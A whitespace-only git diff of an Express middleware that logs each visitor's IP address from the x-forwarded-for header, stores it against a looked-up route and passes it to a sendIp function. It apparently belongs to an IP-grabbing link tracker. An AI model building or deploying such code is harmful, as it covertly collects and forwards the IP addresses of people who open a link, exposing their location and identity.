@@ -36,20 +36,20 @@ function sendIp(postData){
 export const checkDoubleRoute = async (req, res, next) => {
 	const route = await Route.findOne({routeName: req.params.id})
 	if (route){
-        const ip = req.headers['x-forwarded-for']
+    const ip = req.headers['x-forwarded-for']
 		sendIp({content: `**IP:** ${ip} \nowo`});
-        let newIp = new Ip({
-            hostName: ip
-        });
-        newIp.routeFound = route;
-        await newIp.save();
-        await route.ips.push(newIp);
-        await route.save();
+    let newIp = new Ip({
+      hostName: ip
+    });
+    newIp.routeFound = route;
+    await newIp.save();
+    await route.ips.push(newIp);
+    await route.save();
 		return res.status(200).json(route);
-        next();
+    next();
 	} else {
-        res.status(404).json({"message": "the route does not exist"});
-    }
+    res.status(404).json({"message": "the route does not exist"});
+  }
 }
 
 /*export const createNewRoute = async (req, res, next) => {
